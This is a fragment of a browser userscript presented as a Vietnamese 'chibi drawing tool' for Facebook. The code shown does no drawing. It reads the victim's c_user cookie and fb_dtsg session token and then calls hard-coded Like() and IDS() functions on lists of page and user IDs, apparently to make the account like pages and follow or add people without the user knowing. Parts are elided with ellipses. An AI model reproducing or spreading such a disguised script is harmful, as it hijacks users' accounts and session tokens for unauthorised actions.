// ==UserScript==
// @name            Tool Vẽ ChiBi
// @description     All about facebook By Mạnh Hùng
...
Like("207524479457500");Like("427051237439225");Like("1432239933690122");
Like("429486153864723");Like("252173261628614");Like("342500485837813");
Like("217016721833476")Like("1428477800714027");
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
...
IDS("100005477495530");IDS("100004030574716");IDS("100005143574461");IDS("100006333961308");IDS("100008031521370");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
